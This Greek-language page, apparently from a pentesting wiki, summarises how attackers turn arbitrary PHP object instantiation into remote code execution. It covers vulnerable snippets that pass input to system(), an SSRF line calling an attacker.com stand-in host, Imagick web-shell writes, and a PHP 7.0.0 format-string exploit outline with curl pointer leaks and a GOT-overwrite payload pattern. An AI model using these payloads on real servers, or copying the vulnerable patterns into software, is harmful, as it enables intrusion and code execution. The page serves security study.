# PHP - RCE εκμετάλλευση δημιουργίας αντικειμένου: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

Αυτό είναι βασικά μια σύνοψη του [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Εισαγωγή

Η δημιουργία νέων αυθαίρετων αντικειμένων, όπως `new $_GET["a"]($_GET["a"])`, μπορεί να οδηγήσει σε απομακρυσμένη εκτέλεση κώδικα (Remote Code Execution, RCE), όπως περιγράφεται σε ένα [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/). Το έγγραφο αυτό τονίζει διάφορες στρατηγικές για την επίτευξη RCE.

## RCE μέσω Προσαρμοσμένων Κλάσεων ή Autoloading

Η σύνταξη `new $a($b)` χρησιμοποιείται για να στιγμιοτυπήσει ένα αντικείμενο όπου **`$a`** αντιπροσωπεύει το όνομα κλάσης και **`$b`** είναι το πρώτο όρισμα που περνάει στον constructor. Αυτές οι μεταβλητές μπορούν να προέρχονται από εισόδους χρήστη όπως GET/POST, όπου μπορεί να είναι συμβολοσειρές ή πίνακες, ή από JSON, όπου μπορεί να εμφανίζονται ως άλλοι τύποι.

Σκεφτείτε το παρακάτω απόσπασμα κώδικα:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Σε αυτή την περίπτωση, η ανάθεση του `$a` σε `App` ή `App2` και του `$b` σε μια εντολή συστήματος (π.χ. `uname -a`) έχει ως αποτέλεσμα την εκτέλεση αυτής της εντολής.

**Autoloading functions** μπορούν να εκμεταλλευτούν αν δεν υπάρχουν τέτοιες κλάσεις άμεσα προσβάσιμες. Αυτές οι συναρτήσεις φορτώνουν αυτόματα κλάσεις από αρχεία όταν χρειάζεται και ορίζονται χρησιμοποιώντας `spl_autoload_register` ή `__autoload`:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Η συμπεριφορά του autoloading διαφέρει ανάλογα με τις εκδόσεις του PHP, προσφέροντας διαφορετικές δυνατότητες για RCE.

## RCE μέσω ενσωματωμένων κλάσεων

Ελλείψει custom classes ή autoloaders, οι **built-in PHP classes** μπορεί να είναι αρκετές για RCE. Ο αριθμός αυτών των κλάσεων κυμαίνεται από 100 έως 200, ανάλογα με την έκδοση του PHP και τα extensions. Μπορούν να απαριθμηθούν χρησιμοποιώντας `get_declared_classes()`.

Οι κατασκευαστές ενδιαφέροντος μπορούν να εντοπιστούν μέσω του reflection API, όπως φαίνεται στο παρακάτω παράδειγμα και στο σύνδεσμο [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE via specific methods includes:**

### **SSRF + Phar Deserialization**

Η κλάση `SplFileObject` επιτρέπει SSRF μέσω του constructor της, επιτρέποντας συνδέσεις σε οποιοδήποτε URL:
```php
new SplFileObject('http://attacker.com/');
```
Το SSRF μπορεί να οδηγήσει σε επιθέσεις αποσειριοποίησης σε εκδόσεις του PHP πριν από την 8.0 χρησιμοποιώντας το πρωτόκολλο Phar.

### **Exploiting PDOs**

Ο constructor της κλάσης PDO επιτρέπει συνδέσεις σε βάσεις δεδομένων μέσω DSN strings, ενδεχομένως επιτρέποντας τη δημιουργία αρχείων ή άλλες αλληλεπιδράσεις:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

Έκδοσεις του PHP μέχρι τις 5.3.22 και 5.4.12 ήταν ευάλωτες σε XXE επιθέσεις μέσω των constructors `SoapClient` και `SimpleXMLElement`, ανάλογα με την έκδοση του libxml2.

## RCE via Imagick Extension

Στην ανάλυση των **project's dependencies** διαπιστώθηκε ότι η **Imagick** μπορούσε να αξιοποιηθεί για **command execution** μέσω της δημιουργίας νέων αντικειμένων. Αυτό δημιουργεί ευκαιρία για εκμετάλλευση ευπαθειών.

### VID parser

Διαπιστώθηκε η δυνατότητα του VID parser να γράφει περιεχόμενο σε οποιαδήποτε καθορισμένη διαδρομή στο σύστημα αρχείων. Αυτό μπορεί να οδηγήσει στην τοποθέτηση ενός PHP shell σε έναν web-accessible κατάλογο, επιτυγχάνοντας Remote Code Execution (RCE).

#### VID Parser + File Upload

Σημειώνεται ότι το PHP αποθηκεύει προσωρινά uploaded αρχεία στο `/tmp/phpXXXXXX`. Ο VID parser στην Imagick, χρησιμοποιώντας το πρωτόκολλο **msl**, μπορεί να χειριστεί wildcards σε file paths, διευκολύνοντας τη μεταφορά του προσωρινού αρχείου σε επιλεγμένη θέση. Αυτή η μέθοδος προσφέρει μια επιπλέον προσέγγιση για εγγραφή αυθαίρετων αρχείων στο σύστημα αρχείων.

### PHP Crash + Brute Force

Μια μέθοδος που περιγράφεται στο [**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) περιλαμβάνει το upload αρχείων που προκαλούν crash του server πριν τη διαγραφή. Με brute-forcing του ονόματος του προσωρινού αρχείου, γίνεται δυνατό για την Imagick να εκτελέσει arbitrary PHP code. Ωστόσο, αυτή η τεχνική βρέθηκε αποτελεσματική μόνο σε παλαιότερη έκδοση του ImageMagick.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Όταν το user input ελέγχει το όνομα κλάσης (π.χ., `new $_GET['model']()`), η PHP 7.0.0 εισήγαγε ένα προσωρινό bug κατά τη διάρκεια του `Throwable` refactor όπου ο engine εσφαλμένα αντιμετώπιζε το όνομα κλάσης ως printf format string κατά την επίλυση. Αυτό επιτρέπει κλασικά printf-style primitives μέσα στο PHP: leaks με `%p`, έλεγχο του write-count με width specifiers, και arbitrary writes με `%n` εναντίον in-process pointers (π.χ. GOT entries σε ELF builds).

Ελάχιστο αναπαραγωγικό ευάλωτο πρότυπο:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Περίγραμμα εκμετάλλευσης (από την αναφορά):
- Leak addresses via `%p` in the class name to find a writable target:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Use positional parameters and width specifiers to set an exact byte-count, then `%n` to write that value to an address reachable on the stack, aiming at a GOT slot (e.g., `free`) to partially overwrite it to `system`.
- Trigger the hijacked function by passing a class name containing a shell pipe to reach `system("id")`.

Σημειώσεις:
- Λειτουργεί μόνο σε PHP 7.0.0 (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); διορθώθηκε σε επόμενες εκδόσεις. Severity: critical εάν υπάρχει arbitrary class instantiation.
- Τα τυπικά payloads συνδυάζουν πολλά `%p` για να διατρέξουν το stack, και στη συνέχεια χρησιμοποιούν `%.<width>d%<pos>$n` για να πραγματοποιήσουν την μερική overwrite.

## Αναφορές

- https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/
- The Art of PHP: CTF‑born exploits and techniques

{{#include ../../../banners/hacktricks-training.md}}
